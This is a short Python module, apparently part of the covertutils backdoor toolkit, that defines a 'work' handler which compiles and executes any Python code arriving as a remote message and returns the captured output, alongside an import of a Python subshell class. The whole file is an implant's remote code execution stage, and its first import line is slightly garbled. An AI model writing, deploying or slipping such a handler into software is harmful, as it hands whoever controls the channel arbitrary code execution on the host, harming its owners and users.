from future import standard_library
standard_library.install_aliases()
from builtins import str
def work( storage, message ) :
	import sys
	import io
	ret = ' '
	try :
		# print "Starting Execution"
		compiled_message = compile(message, '<remote>', 'exec')
		# print "Compiled"
		retIO = io.StringIO()
		sys.stdout = retIO
		exec (compiled_message)
		sys.stdout = sys.__stdout__
		# print "Executed"
		ret = retIO.getvalue()
	except Exception as e:
		ret = str(e)
		# print "Exception on execution of '%s'" % message
	# print e
	return ret


from covertutils.shells.subshells import PythonAPISubShell as shell
